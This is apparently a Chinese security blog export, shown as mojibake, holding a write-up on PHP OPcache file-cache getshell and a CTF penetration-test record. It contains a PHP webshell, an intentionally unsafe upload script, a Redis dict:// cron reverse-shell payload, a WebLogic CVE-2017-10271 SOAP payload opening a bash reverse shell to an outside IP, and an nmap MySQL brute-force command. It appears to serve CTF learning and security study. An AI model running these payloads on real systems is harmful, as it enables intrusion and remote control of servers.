cliæ¨¡å¼ä¸‹ï¼Œæ¯æ¬¡æ‰§è¡ŒPHPè„šæœ¬ï¼Œå››ä¸ªæ­¥éª¤éƒ½ä¼šä¾æ¬¡æ‰§è¡Œä¸€éï¼› åœ¨PHP-FPMæ¨¡å¼ä¸‹ï¼Œæ­¥éª¤1)åœ¨PHP-FPMå¯åŠ¨æ—¶æ‰§è¡Œä¸€æ¬¡ï¼Œåç»­çš„è¯·æ±‚ä¸­ä¸å†æ‰§è¡Œï¼›æ­¥éª¤2)~4)æ¯ä¸ªè¯·æ±‚éƒ½è¦æ‰§è¡Œä¸€éï¼› å…¶å®æ­¥éª¤2)ã€3)ç”Ÿæˆçš„è¯­æ³•æ ‘å’Œopcodeï¼ŒåŒä¸€ä¸ªPHPè„šæœ¬æ¯æ¬¡è¿è¡Œçš„ç»“æœéƒ½æ˜¯ä¸€æ ·çš„ï¼Œ åœ¨PHP-FPMæ¨¡å¼ä¸‹ï¼Œæ¯æ¬¡è¯·æ±‚éƒ½è¦å¤„ç†ä¸€éï¼Œæ˜¯å¯¹ç³»ç»Ÿèµ„æºæå¤§çš„æµªè´¹ï¼Œé‚£ä¹ˆæœ‰æ²¡æœ‰åŠæ³•ä¼˜åŒ–å‘¢ï¼Ÿ å½“ç„¶æœ‰ï¼Œå¦‚ï¼š OPCacheï¼šå‰èº«æ˜¯Zend Optimizer+ ï¼Œæ˜¯ Zend Server çš„ä¸€ä¸ªå¼€æºç»„ä»¶ï¼›å®˜æ–¹å‡ºå“ï¼Œå¼ºåŠ›æ¨è APCï¼šAlternative PHP Cache æ˜¯ä¸€ä¸ªå¼€æ”¾è‡ªç”±çš„ PHP opcode ç¼“å­˜ç»„ä»¶ï¼Œç”¨äºç¼“å­˜ã€ä¼˜åŒ– PHP ä¸­é—´ä»£ç ï¼›å·²ç»ä¸æ›´æ–°äº†ä¸æ¨è APCuï¼šæ˜¯APCçš„ä¸€ä¸ªåˆ†æ”¯ï¼Œå…±äº«å†…å­˜ï¼Œç¼“å­˜ç”¨æˆ·æ•°æ®ï¼Œä¸èƒ½ç¼“å­˜opcodeï¼Œå¯ä»¥é…åˆOpcache ä½¿ç”¨ eAccelerateï¼šåŒæ ·æ˜¯ä¸æ›´æ–°äº†ï¼Œä¸æ¨è xCacheï¼šä¸å†æ¨èä½¿ç”¨äº† 0x02 OPCache ä»‹ç» OPCache æ˜¯Zendå®˜æ–¹å‡ºå“çš„ï¼Œå¼€æ”¾è‡ªç”±çš„ opcode ç¼“å­˜æ‰©å±•ï¼Œè¿˜å…·æœ‰ä»£ç ä¼˜åŒ–åŠŸèƒ½ï¼Œçœå»äº†æ¯æ¬¡åŠ è½½å’Œè§£æ PHP è„šæœ¬çš„å¼€é”€ã€‚ PHP 5.5.0 åŠåç»­ç‰ˆæœ¬ä¸­å·²ç»ç»‘å®šäº† OPcache æ‰©å±•ã€‚ç¼“å­˜ä¸¤ç±»å†…å®¹: OPCode Interned Stringï¼Œå¦‚æ³¨é‡Šã€å˜é‡åç­‰ å…±äº«å†…å­˜ UNIX/Linux ç³»ç»Ÿæä¾›å¾ˆå¤šç§è¿›ç¨‹é—´å†…å­˜å…±äº«çš„æ–¹å¼ï¼š System-V shm API : System Vå…±äº«å†…å­˜, sysv shmæ˜¯æŒä¹…åŒ–çš„ï¼Œé™¤éè¢«ä¸€ä¸ªè¿›ç¨‹æ˜ç¡®çš„åˆ é™¤ï¼Œå¦åˆ™å®ƒå§‹ç»ˆå­˜åœ¨äºå†…å­˜é‡Œï¼Œç›´åˆ°ç³»ç»Ÿå…³æœºï¼› mmap APIï¼š mmapæ˜ å°„çš„å†…å­˜åœ¨ä¸æ˜¯æŒä¹…åŒ–çš„ï¼Œå¦‚æœè¿›ç¨‹å…³é—­ï¼Œæ˜ å°„éšå³å¤±æ•ˆï¼Œé™¤éäº‹å…ˆå·²ç»æ˜ å°„åˆ°äº†ä¸€ä¸ªæ–‡ä»¶ä¸Š å†…å­˜æ˜ å°„æœºåˆ¶mmapæ˜¯POSIXæ ‡å‡†çš„ç³»ç»Ÿè°ƒç”¨ï¼Œæœ‰åŒ¿åæ˜ å°„å’Œæ–‡ä»¶æ˜ å°„ä¸¤ç§ mmapçš„ä¸€å¤§ä¼˜ç‚¹æ˜¯æŠŠæ–‡ä»¶æ˜ å°„åˆ°è¿›ç¨‹çš„åœ°å€ç©ºé—´ é¿å…äº†æ•°æ®ä»ç”¨æˆ·ç¼“å†²åŒºåˆ°å†…æ ¸page cacheç¼“å†²åŒºçš„å¤åˆ¶è¿‡ç¨‹ï¼› å½“ç„¶è¿˜æœ‰ä¸€ä¸ªä¼˜ç‚¹å°±æ˜¯ä¸éœ€è¦é¢‘ç¹çš„read/writeç³»ç»Ÿè°ƒç”¨ POSIX APIï¼šSystem V çš„å…±äº«å†…å­˜æ˜¯è¿‡æ—¶çš„, POSIXå…±äº«å†…å­˜æä¾›äº†ä½¿ç”¨æ›´ç®€å•ã€è®¾è®¡æ›´åˆç†çš„API. Unix socket API OPCache ä½¿ç”¨äº†å‰ä¸‰ä¸ªå…±äº«å†…å­˜æœºåˆ¶ï¼Œæ ¹æ®é…ç½®æˆ–è€…é»˜è®¤mmap å†…å­˜å…±äº«æ¨¡å¼ã€‚ ä¾æ®PHPå­—èŠ‚ç ç¼“å­˜çš„åœºæ™¯ï¼ŒOPCacheçš„å†…å­˜ç®¡ç†è®¾è®¡éå¸¸ç®€å•ï¼Œå¿«é€Ÿè¯»å†™ï¼Œä¸é‡Šæ”¾å†…å­˜ï¼Œè¿‡æœŸæ•°æ®ç½®ä¸ºWastedã€‚ å½“Wastedå†…å­˜å¤§äºè®¾å®šå€¼æ—¶ï¼Œè‡ªåŠ¨é‡å¯OPCacheæœºåˆ¶ï¼Œæ¸…ç©ºå¹¶é‡æ–°ç”Ÿæˆç¼“å­˜ã€‚ äº’æ–¥é” ä»»ä½•å†…å­˜èµ„æºçš„æ“ä½œï¼Œéƒ½æ¶‰åŠåˆ°é”çš„æœºåˆ¶ã€‚ å…±äº«å†…å­˜ï¼šä¸€ä¸ªå•ä½æ—¶é—´å†…ï¼Œåªå…è®¸ä¸€ä¸ªè¿›ç¨‹æ‰§è¡Œå†™æ“ä½œï¼Œå…è®¸å¤šä¸ªè¿›ç¨‹æ‰§è¡Œè¯»æ“ä½œï¼›å†™æ“ä½œåŒæ—¶ï¼Œä¸é˜»æ­¢è¯»æ“ä½œï¼Œä»¥è‡³äºå¾ˆå°‘æœ‰é”æ­»çš„æƒ…å†µã€‚ è¿™å°±å¼•å‘å¦å¤–ä¸€ä¸ªé—®é¢˜ï¼šæ–°ä»£ç ã€å¤§æµé‡åœºæ™¯ï¼Œè¿›ç¨‹æ’é˜Ÿæ‰§è¡Œç¼“å­˜opcodeæ“ä½œï¼›é‡å¤å†™å…¥ï¼Œå¯¼è‡´èµ„æºæµªè´¹ã€‚ 0x03 OPCache ç¼“å­˜è§£è¯» OPCache æ˜¯å®˜æ–¹çš„Opcode ç¼“å­˜è§£å†³æ–¹æ¡ˆï¼Œåœ¨PHP5.5ç‰ˆæœ¬ä¹‹åï¼Œå·²ç»æ‰“åŒ…åˆ°PHPæºç ä¸­ä¸€èµ·å‘å¸ƒã€‚ å®ƒå°†PHPç¼–è¯‘äº§ç”Ÿçš„å­—èŠ‚ç ä»¥åŠæ•°æ®ç¼“å­˜åˆ°å…±äº«å†…å­˜ä¸­, åœ¨æ¯æ¬¡è¯·æ±‚ï¼Œä»ç¼“å­˜ä¸­ç›´æ¥è¯»å–ç¼–è¯‘åçš„opcodeï¼Œè¿›è¡Œæ‰§è¡Œã€‚ é€šè¿‡èŠ‚çœè„šæœ¬çš„ç¼–è¯‘è¿‡ç¨‹ï¼Œæé«˜PHPçš„è¿è¡Œæ•ˆç‡ã€‚å¦‚æœæ­£åœ¨ä½¿ç”¨APCæ‰©å±•ï¼ŒåšåŒæ ·çš„å·¥ä½œï¼Œç°åœ¨å¼ºçƒˆæ¨èOPCacheæ¥ä»£æ›¿ï¼Œå°¤å…¶æ˜¯PHP7ä¸­ã€‚ 0x04 OPCache çš„é…ç½® å†…å­˜é…ç½® opcache.preferred_memory_model=\"mmap\" OPcache é¦–é€‰çš„å†…å­˜æ¨¡å—ã€‚å¦‚æœç•™ç©ºï¼ŒOPcache ä¼šé€‰æ‹©é€‚ç”¨çš„æ¨¡å—ï¼Œ é€šå¸¸æƒ…å†µä¸‹ï¼Œè‡ªåŠ¨é€‰æ‹©å°±å¯ä»¥æ»¡è¶³éœ€æ±‚ã€‚å¯é€‰å€¼åŒ…æ‹¬ï¼šmmapï¼Œshm,posix ä»¥åŠwin32ã€‚ opcache.memory_consumption=64 OPcache çš„å…±äº«å†…å­˜å¤§å°ï¼Œä»¥å…†å­—èŠ‚ä¸ºå•ä½ï¼Œé»˜è®¤64M opcache.interned_strings_buffer=4 ç”¨æ¥å­˜å‚¨ä¸´æ—¶å­—ç¬¦ä¸²çš„å†…å­˜å¤§å°ï¼Œä»¥å…†å­—èŠ‚ä¸ºå•ä½ï¼Œé»˜è®¤4M opcache.max_wasted_percentage=5 æµªè´¹å†…å­˜çš„ä¸Šé™ï¼Œä»¥ç™¾åˆ†æ¯”è®¡ã€‚å¦‚æœè¾¾åˆ°æ­¤ä¸Šé™ï¼Œé‚£ä¹ˆ OPcache å°†äº§ç”Ÿé‡æ–°å¯åŠ¨ç»­å‘äº‹ä»¶ã€‚é»˜è®¤5 å…è®¸ç¼“å­˜çš„æ–‡ä»¶æ•°é‡ä»¥åŠå¤§å° opcache.max_accelerated_files=2000 OPcache å“ˆå¸Œè¡¨ä¸­å¯å­˜å‚¨çš„è„šæœ¬æ–‡ä»¶æ•°é‡ä¸Šé™ã€‚çœŸå®çš„å–å€¼æ˜¯åœ¨è´¨æ•°é›†åˆ{ 223, 463, 983, 1979, 3907, 7963, 16229, 32531, 65407, 130987 } ä¸­æ‰¾åˆ°çš„ç¬¬ä¸€ä¸ªå¤§äºç­‰äºè®¾ç½®å€¼çš„è´¨æ•°ã€‚è®¾ç½®å€¼å–å€¼èŒƒå›´æœ€å°å€¼æ˜¯200ï¼Œæœ€å¤§å€¼åœ¨ PHP 5.5.6 ä¹‹å‰æ˜¯100000ï¼ŒPHP 5.5.6 åŠä¹‹åæ˜¯1000000ã€‚é»˜è®¤å€¼2000 opcache.max_file_size=0 ä»¥å­—èŠ‚ä¸ºå•ä½çš„ç¼“å­˜çš„æ–‡ä»¶å¤§å°ä¸Šé™ã€‚è®¾ç½®ä¸º 0 è¡¨ç¤ºç¼“å­˜å…¨éƒ¨æ–‡ä»¶ã€‚é»˜è®¤å€¼0 æ³¨é‡Šç›¸å…³çš„ç¼“å­˜ opcache.load_commentsboolean å¦‚æœç¦ç”¨ï¼Œåˆ™å³ä½¿æ–‡ä»¶ä¸­åŒ…å«æ³¨é‡Šï¼Œä¹Ÿä¸ä¼šåŠ è½½è¿™äº›æ³¨é‡Šå†…å®¹ã€‚æœ¬é€‰é¡¹å¯ä»¥å’Œopcache.save_comments ä¸€èµ·ä½¿ç”¨ï¼Œä»¥å®ç°æŒ‰éœ€åŠ è½½æ³¨é‡Šå†…å®¹ã€‚ opcache.fast_shutdown boolean å¦‚æœå¯ç”¨ï¼Œåˆ™ä¼šä½¿ç”¨å¿«é€Ÿåœæ­¢ç»­å‘äº‹ä»¶ã€‚æ‰€è°“å¿«é€Ÿåœæ­¢ç»­å‘äº‹ä»¶æ˜¯æŒ‡ä¾èµ– Zend å¼•æ“çš„å†…å­˜ç®¡ç†æ¨¡å— ä¸€æ¬¡é‡Šæ”¾å…¨éƒ¨è¯·æ±‚å˜é‡çš„å†…å­˜ï¼Œè€Œä¸æ˜¯ä¾æ¬¡é‡Šæ”¾æ¯ä¸€ä¸ªå·²åˆ†é…çš„å†…å­˜å—ã€‚ äºŒçº§ç¼“å­˜çš„é…ç½® opcache.file_cache é…ç½®äºŒçº§ç¼“å­˜ç›®å½•å¹¶å¯ç”¨äºŒçº§ç¼“å­˜ã€‚å¯ç”¨äºŒçº§ç¼“å­˜å¯ä»¥åœ¨ SHM å†…å­˜æ»¡äº†ã€æœåŠ¡å™¨é‡å¯æˆ–è€…é‡ç½® SHM çš„æ—¶å€™æé«˜æ€§èƒ½ã€‚é»˜è®¤å€¼ä¸ºç©ºå­—ç¬¦ä¸²\"\"ï¼Œè¡¨ç¤ºç¦ç”¨åŸºäºæ–‡ä»¶çš„ç¼“å­˜ã€‚ opcache.file_cache_onlyboolean å¯ç”¨æˆ–ç¦ç”¨åœ¨å…±äº«å†…å­˜ä¸­çš„ opcode ç¼“å­˜ã€‚ opcache.file_cache_consistency_checksboolean å½“ä»æ–‡ä»¶ç¼“å­˜ä¸­åŠ è½½è„šæœ¬çš„æ—¶å€™ï¼Œæ˜¯å¦å¯¹æ–‡ä»¶çš„æ ¡éªŒå’Œè¿›è¡ŒéªŒè¯ã€‚ opcache.file_cache_fallbackboolean åœ¨ Windows å¹³å°ä¸Šï¼Œå½“ä¸€ä¸ªè¿›ç¨‹æ— æ³•é™„åŠ åˆ°å…±äº«å†…å­˜çš„æ—¶å€™ï¼Œ ä½¿ç”¨åŸºäºæ–‡ä»¶çš„ç¼“å­˜ï¼Œä¹Ÿå³ï¼šopcache.file_cache_only=1ã€‚éœ€è¦æ˜¾ç¤ºçš„å¯ç”¨æ–‡ä»¶ç¼“å­˜ã€‚ 0x05 æ¼æ´ä»‹ç» ç°åœ¨éœ€è¦çŸ¥é“çš„æ˜¯ï¼šOPcacheæ‰©å±•åœ¨PHP5.5.0ç‰ˆæœ¬åä¸­å·²ç»ç»‘å®šäº†ï¼Œå®ƒå¯ä»¥æŠŠPHPè„šæœ¬é¢„ç¼–è¯‘çš„å­—èŠ‚ç å­˜æ”¾åˆ°ç¼“å­˜ä¸­ï¼Œä»è€Œæé«˜æ€§èƒ½ï¼ŒåŠ é€Ÿè®¿é—®ã€‚åŒæ—¶ä¹Ÿå¯ä»¥åˆ©ç”¨å®ƒæ¥è¿›è¡Œgetshellã€‚ å…³äºOPCache åœ¨æˆ‘ä»¬æŒ‡å®šäº†ä¸€ä¸ªç¼“å­˜ç›®å½•ï¼ˆåé¢æåˆ°ï¼‰åï¼Œphpä¼šæŠŠç¼–è¯‘å¥½çš„phpå­—èŠ‚ç æ–‡ä»¶æ”¾åˆ°è¿™ä¸ªç¼“å­˜ç›®å½•ä¸­ã€‚è¿™é‡Œå‡è®¾è¯¥ç¼“å­˜ç›®å½•æ˜¯/var/www/html/opcacheï¼Œæœªè®¿é—®å‰ï¼Œopcacheæ–‡ä»¶å¤¹ä¸ºç©ºã€‚æ¥ä¸‹å»æˆ‘å»è®¿é—® index.phpåï¼Œphpä¼šåœ¨ opcacheæ–‡ä»¶å¤¹ä¸­åˆ›å»ºä¸€ä¸ªåä¸ºmd5å“ˆå¸Œå€¼çš„æ–‡ä»¶å¤¹ï¼Œå…¶ä¸‹çš„ç›®å½•ç»“æ„å’Œ index.phpæ‰€åœ¨ç›®å½•ç»“æ„ç›¸åŒï¼ŒåŒæ—¶ç”Ÿæˆäº† index.php.binã€‚ è¿™ä¸ªindex.php.bin å°±æ˜¯ index.php çš„ç¼“å­˜æ–‡ä»¶ã€‚å¹¶ä¸”ä½œä¸ºwww-dataç”¨æˆ·ï¼Œæˆ‘ä»¬å¯¹ 5672f68788bcb25b11403b33f5d1497f å…·æœ‰è¯»å†™æ‰§è¡Œæƒé™ã€‚è¿™æ ·ï¼Œæˆ‘ä»¬æƒ³åŠæ³•æŠŠè¿™ä¸ªindex.php.binæ›¿æ¢ä¸ºåŒ…å«æœ‰æ¶æ„ä»£ç çš„index.php.binæ–‡ä»¶ï¼Œå½“æˆ‘ä»¬å†æ¬¡å»è®¿é—®index.phpæ—¶ï¼Œphpä¼šé€‰æ‹©åŠ è½½è¿™ä¸ªç¼“å­˜æ–‡ä»¶ï¼Œä»è€Œæˆ‘ä»¬è¾¾åˆ°äº†getshellçš„ç›®çš„ã€‚ æ¼æ´åˆ©ç”¨æ¡ä»¶ çŸ¥é“opcacheçš„ç¼“å­˜è·¯å¾„ã€ä¸”æœåŠ¡ç«¯å¼€å¯äº†opcache.file_cache_onlyï¼ˆä¹Ÿå°±æ˜¯ç¼“å­˜æ–‡ä»¶ä¼˜å…ˆçº§ ä¼˜å…ˆçš„æ„æ€ï¼‰ã€ç¦ç”¨äº†opcache.validate_timestampsï¼ˆå…³é—­æ—¶é—´æˆ³éªŒè¯ï¼‰ã€‚ä¸è¿‡è¿™é‡Œå¦‚æœå¼€å¯äº†æ—¶é—´æˆ³éªŒè¯ä¹Ÿæ˜¯å¯ä»¥getshellï¼Œä¸è¿‡æ›´éº»çƒ¦ å¯ä»¥æ€»ç»“å‡ºåˆ©ç”¨æ–¹æ³•å¦‚ä¸‹ï¼š å¼„æ¸…æ¥šå—å®³è€…ä½¿ç”¨çš„æ˜¯32ä½è¿˜æ˜¯64ä½æ“ä½œç³»ç»Ÿ æ‰¾åˆ°å—å®³è€…çš„system ID åœ¨æœ¬åœ°ç”Ÿæˆç¼“å­˜æ–‡ä»¶ å°†ç¼“å­˜æ–‡ä»¶ä¸­çš„system IDæ›¿æ¢ä¸ºå—å®³è€…çš„system ID ç”¨ä½ çš„æ–‡ä»¶è¦†ç›–å—å®³è€…çš„ç¼“å­˜æ–‡ä»¶ã€‚ get shellã€‚ ç”±ä¸Šå›¾å·²ç»çŸ¥é“äº†opcacheç¼“å­˜æ–‡ä»¶åœ°å€ï¼Œå¹¶ä¸”å¼€å¯äº†æ—¶é—´æˆ³éªŒè¯ï¼Œå› æ­¤è¿™é‡Œéœ€è¦å¾—åˆ°æ–‡ä»¶åˆ›å»ºæ—¶é—´ä»¥åŠsystem_id æ¼æ´å¤ç° docker run -d -p 8888:80 -v /var/www:/var/www/html --privileged=true php:7.0 è¿™é‡Œç¯å¢ƒé…ç½®å‡ºé—®é¢˜ï¼Œæš‚æ—¶cvæ–‡ç« äº†ã€‚è¿™é‡Œè¿›å…¥ä¹‹åä¿®æ”¹é…ç½®æ–‡ä»¶php.ini //ä¿®æ”¹æˆ(å»æ‰;æ³¨é‡Š,å°†0æ”¹æˆ1) opcache.enable=1 å…³é—­æ—¶é—´æˆ³éªŒè¯ ;opcache.validate_timestamps=1 //ä¿®æ”¹æˆ(å»æ‰;æ³¨é‡Š,å°†1æ”¹æˆ0) opcache.validate_timestamps=0 è®¾ç½®Opcacheç¼“å­˜è·¯å¾„ ;opcache.file_cache= //ä¿®æ”¹ opcache.file_cache=\"/tmp/opcache\" è®¾ç½®ç¼“å­˜ä¼˜å…ˆçº§ ;opcache.file_cache_only=0 //ä¿®æ”¹ opcache.file_cache_only=1 åœ¨æœ€åä¸€è¡Œæ·»åŠ  ç”¨æ¥å¼•ç”¨opcache zend_extension=opcache.so é‡å¯æœåŠ¡å™¨ç”Ÿæ•ˆ åœ¨å®¿ä¸»æœºçš„webç›®å½•åˆ›å»ºå³å¯ index.php &lt;html&gt; &lt;body&gt; &lt;form action=\"upload-file.php\" method=\"post\" enctype=\"multipart/form-data\"&gt; &lt;label for=\"file\"&gt;filename:&lt;/label&gt; &lt;input type=\"file\" name=\"file\" id=\"file\" /&gt; &lt;br/&gt; &lt;label for=\"filepath\"&gt;filepath:&lt;/label&gt; &lt;input type=\"text\" name=\"filepath\" id=\"filepath\" /&gt; &lt;br/&gt; &lt;input type=\"submit\" name=\"submit\" value=\"submit\" /&gt; &lt;/form&gt; &lt;/body&gt; &lt;/html&gt; file_upload.php &lt;?php $path = $_POST['filepath']; echo \"filename: \" . $_FILES[\"file\"][\"name\"] . \"&lt;br /&gt;\"; echo \"type: \" . $_FILES[\"file\"][\"type\"] . \"&lt;br /&gt;\"; echo \"size: \" . ($_FILES[\"file\"][\"size\"] / 1024) . \" Kb&lt;br /&gt;\"; move_uploaded_file($_FILES[\"file\"][\"tmp_name\"], $path . $_FILES[\"file\"][\"name\"]); echo \"save : \" . $path . $_FILES[\"file\"][\"name\"]; ?&gt; phpinfo.php &lt;?php phpinfo(); ?&gt; å‡è®¾ç›®æ ‡ç«™ç‚¹å·²ç»åˆä¸€ä¸ªphpinfo()æ–‡ä»¶äº†ï¼Œé€šè¿‡è¿™ä¸ªæ–‡ä»¶å¯ä»¥å¾—åˆ°Opcacheç¼“å­˜ç›®å½•,è¿˜éœ€è¦ä¸‹ä¸€æ­¥è®¡ç®—system_id system_idæ˜¯å½“å‰PHPç‰ˆæœ¬å·ï¼ŒZendæ‰©å±•ç‰ˆæœ¬å·ä»¥åŠå„ä¸ªæ•°æ®ç±»å‹å¤§å°çš„MD5å“ˆå¸Œå€¼ è„šæœ¬åœ°å€:https://github.com/GoSecure/php7-opcache-override æ­¤æ—¶å¯ä»¥åˆ©ç”¨ä¸Šä¼ æ¼æ´å°†æ–‡ä»¶ä¸Šä¼ åˆ°webç›®å½•ï¼Œä½†æ˜¯ç›®å½•æ²¡æœ‰è¯»å†™çš„æƒé™ï¼Œè¿™æ—¶å€™å°±å¯é€šè¿‡/tmp/opcache/[system_id]/var/www/index.php.binä¸ºä¸€ä¸ªwebshellçš„äºŒè¿›åˆ¶ç¼“å­˜è¿è¡Œwebshell æœ¬åœ°æ„å»ºwebshellæ–‡ä»¶index.php &lt;?php system($_GET['cmd']); ?&gt; 1.åœ¨æœ¬åœ°php.iniä¸­è®¾ç½®opcache.file_cacheä¸ºä½ æ‰€æƒ³è¦æŒ‡å®šçš„ç¼“å­˜ç›®å½• 2.è¿è¡ŒphpæœåŠ¡å™¨å‘indexå‘é€è¯·æ±‚ï¼Œè§¦å‘ç¼“å­˜ç–«æƒ…è¿›è¡Œæ–‡ä»¶ç¼“å­˜ 3.æ‰“å¼€ç¼“å­˜ç›®å½•ä¸­çš„index.php.binæ–‡ä»¶ä¿®æ”¹é‡Œé¢çš„çš„system_idä¸ºç›®æ ‡ç«™ç‚¹çš„system_id è®°äº‹æœ¬æ‰“å¼€å°±okæ”¹æˆæˆ‘ä»¬ç”¨è„šæœ¬è®¡ç®—å‡ºæ¥çš„system_idå€¼ é€šè¿‡ä¸Šä¼ æ¼æ´å°†ä¿®æ”¹åçš„index.php.binä¸Šä¼ åˆ°tmp/opcache/[system_id]/var/www/index.php.binè¦†ç›–æ‰åŸæ¥çš„index.php.bin è‡³äº2023æ˜¥ç§‹æ¯å¤å­£èµ›çš„php_againï¼Œæ€è·¯ä¹Ÿå¤§è‡´ç›¸åŒï¼Œä¸è¿‡é‚£ä¸ªæ˜¯php8.0ç‰ˆæœ¬çš„getshellï¼Œæ›´ä¸ºå¤æ‚ï¼Œè€Œä¸”é‡Œé¢æ¶‰åŠåˆ°äº†è½¯é“¾æ¥ï¼ŒåŒæ—¶è¿˜éœ€è¦ç”¨åˆ°ä¸€ä¸ªpythonçš„ææƒRCEï¼Œæœ‰ç‚¹å¤æ‚ï¼Œæš‚æ—¶åªæƒ³çœ‹ä¸ªæ€è·¯äº†ï¼Œå¤ç°æœ‰ç‚¹éš¾ï¼ˆæ¯•ç«Ÿç¯å¢ƒè¿˜æ­ä¸èµ·æ¥ï¼‰ 0x06 å‚è€ƒæ–‡ç«  CISCN2023 unzipè½¯é“¾æ¥getshell PHP8 OPCACHEç¼“å­˜æ–‡ä»¶å¯¼è‡´RCE 2023å¹´æ˜¥ç§‹æ¯ç½‘ç»œå®‰å…¨è”èµ›æ˜¥å­£èµ› web php_again [PHP 8.2.2 OPcache Binary Webshell + CVE-2022-42919 LPE] PHP Opcacheçš„å·¥ä½œåŸç† åˆ©ç”¨PHPçš„OPcacheæœºåˆ¶getshell php7çš„Opcache getshell","tags":["åŸºæœ¬çŸ¥è¯†"],"categories":["åŸºæœ¬çŸ¥è¯†"]},{"path":"/2024/03/31/shen-tou-ce-shi-ji-lu/","content":"Web1 FLAG1 è¿›å…¥é¡µé¢çœ‹æºç  åˆ°è¿™é‡Œå°±å¯ä»¥æƒ³åˆ°ssrfæ¼æ´äº†ï¼Œç›´æ¥å°è¯•fileä¼ªåè®®è¯»å–æ•æ„Ÿæ–‡ä»¶ è¿™é‡Œä¹Ÿæ˜¯ç›´æ¥æˆåŠŸï¼Œæ²¡æœ‰è¿‡æ»¤ï¼Œæ¥ä¸‹æ¥æ ¹æ®æç¤ºè¯´flagåœ¨æ ¹ç›®å½•ï¼Œå°è¯•ç›´æ¥è¯»å–/flagï¼Œä¹Ÿæ˜¯ç›´æ¥æ‹¿åˆ° FLAG3 æç¤ºå†…ç½‘èŒƒåœ¨ï¼š172.18.240.0/24ï¼Œç›´æ¥åˆ©ç”¨httpåè®®è¿›è¡Œå†…ç½‘ä¸»æœºæ¢æµ‹ï¼Œå¦‚ä¸‹å›¾å‘ç°ä¸¤å°å­˜æ´»ä¸»æœºï¼Œä¸è¿‡å…³æ³¨ç¬¬äºŒä¸ªå³å¯ åˆæ­¥æ‰«é™¤ä¸¤å°å†…ç½‘ä¸»æœºï¼š172.18.240.5å’Œ172.18.240.7ï¼Œå…¶ä¸­5ä¸ºå½“å‰æœåŠ¡å™¨ï¼Œä¸ç”¨ç†ä¼šã€‚æ¥ç€æ‰«ä¸€äº›æ•æ„Ÿç›®å½•ï¼Œå¾ˆå¹¸è¿ï¼Œçœ‹åˆ°7ä¸»æœºçš„6379ç«¯å£å·²æ‰“å¼€ ç›´æ¥dictå°è¯•çœ‹ä¸€ä¸‹æ˜¯å¦æ˜¯æœªæˆæƒï¼Œå¦‚ä¸‹å›¾ï¼Œç¡®å®šä¸ºæœªæˆæƒï¼Œå°è¯•å†™å…¥è®¡åˆ’ä»»åŠ¡åå¼¹shell # æ¸…ç©º key dict://172.18.240.7:6379/flushall # è®¾ç½®è¦æ“ä½œçš„è·¯å¾„ä¸ºå®šæ—¶ä»»åŠ¡ç›®å½• dict://172.18.240.7:6379/config set dir /var/spool/cron/ # åœ¨å®šæ—¶ä»»åŠ¡ç›®å½•ä¸‹åˆ›å»º root çš„å®šæ—¶ä»»åŠ¡æ–‡ä»¶ dict://172.18.240.7:6379/config set dbfilename root # å†™å…¥ Bash åå¼¹ shell çš„ payload dict://172.18.240.7:6379/set 1 \" * * * * * /bin/bash -i &gt;%26 /dev/tcp/x.x.x.x/5555 0&gt;%261 \" # ä¿å­˜ä¸Šè¿°æ“ä½œ dict://172.18.240.7:6379/save æœ€ç»ˆæ‹¿åˆ°shellï¼Œå¾—åˆ°flag FLAG3 åœ¨è¿™é‡Œä¹Ÿæ˜¯å°´å°¬ï¼Œæ‹¿åˆ°shelläº†ï¼Œä»¥ä¸ºè¯´çš„æ•°æ®åº“æŒ‡çš„æ˜¯MySQLï¼Œç ”ç©¶äº†åŠå¤©æ— æœï¼Œçªç„¶æƒ³åˆ°redisä¹Ÿæ˜¯æ•°æ®åº“ï¼Œå°è¯•è¯»å–å½“å‰æ•°æ®åº“æ‰€æœ‰çš„key çœ‹åˆ°å­˜åœ¨flag çš„keyï¼Œç›´æ¥getæ‹¿åˆ°å³å¯ Web2 FLAG1 è®¿é—®é¦–é¡µï¼Œç»å…¸weblogicé¡µé¢ï¼Œè¿™é‡Œæ‰¾äº†å‡ ä¸ªç½‘ä¸Špocæ²¡å•¥ç”¨ï¼Œæ¥ç€ç›´æ¥å·¥å…·æ¢­å“ˆäº† å‘ç°å­˜åœ¨CVE-2017-10271ï¼ˆxmlååºåˆ—åŒ–æ¼æ´ï¼‰ï¼Œç›´æ¥å‘½ä»¤æ‰§è¡Œå» æ‹¿åˆ°flag1 ä¹‹åè¿˜æƒ³ç€å·¥å…·ä¸€æŠŠæ¢­ï¼Œå¥ˆä½•å·¥å…·åƒåœ¾ï¼Œè¿˜æ˜¯æ‰‹å·¥å§ï¼Œè®¿é—®wls-wsat/CoordinatorPortTypeè·¯ç”±ï¼Œå°è¯•pocåˆ©ç”¨xmlååºåˆ—åŒ–ï¼Œå¦‚ä¸Šå›¾ï¼ŒæˆåŠŸåå¼¹shell &lt;soapenv:Envelope xmlns:soapenv=\"http://schemas.xmlsoap.org/soap/envelope/\"&gt; &lt;soapenv:Header&gt; &lt;work:WorkContext xmlns:work=\"http://bea.com/2004/06/soap/workarea/\"&gt; &lt;java version=\"1.4.0\" class=\"java.beans.XMLDecoder\"&gt; &lt;void class=\"java.lang.ProcessBuilder\"&gt; &lt;array class=\"java.lang.String\" length=\"3\"&gt; &lt;void index=\"0\"&gt; &lt;string&gt;/bin/bash&lt;/string&gt; &lt;/void&gt; &lt;void index=\"1\"&gt; &lt;string&gt;-c&lt;/string&gt; &lt;/void&gt; &lt;void index=\"2\"&gt; &lt;string&gt;bash -i &amp;gt;&amp;amp; /dev/tcp/124.220.233.26/5555 0&amp;gt;&amp;amp;1&lt;/string&gt; &lt;/void&gt; &lt;/array&gt; &lt;void method=\"start\"/&gt;&lt;/void&gt; &lt;/java&gt; &lt;/work:WorkContext&gt; &lt;/soapenv:Header&gt; &lt;soapenv:Body/&gt; &lt;/soapenv:Envelope&gt; å‘ç°ä¸€ä¸ªå­˜æ´»ä¸»æœº172.25.20.12 nmap --script=mysql-brute --script-args userdb=/home/kali/user.txt,passdb=/home/kali/pass.txt 192.168.71.1 -p 3306 è¿™é‡Œæ„Ÿè§‰å°±æ˜¯MySQLçš„çˆ†ç ´ï¼Œä½†ä¹Ÿå¯èƒ½ä¸æ˜¯ã€‚ Web3 FLAG1 çœ‹åˆ°ç½‘ç«™ç”¨çš„java servletï¼Œå…ˆæ‰«ä¸ªç›®å½•çœ‹çœ‹ å¾ˆå¥½ï¼Œå…¸å‹çš„Spring boot actuatoræ•æ„Ÿä¿¡æ¯æ³„éœ²ï¼Œç›´æ¥è®¿é—®/acutuator/envçœ‹ä¸€ä¸‹ç¯å¢ƒé…ç½®ä¿¡æ¯ 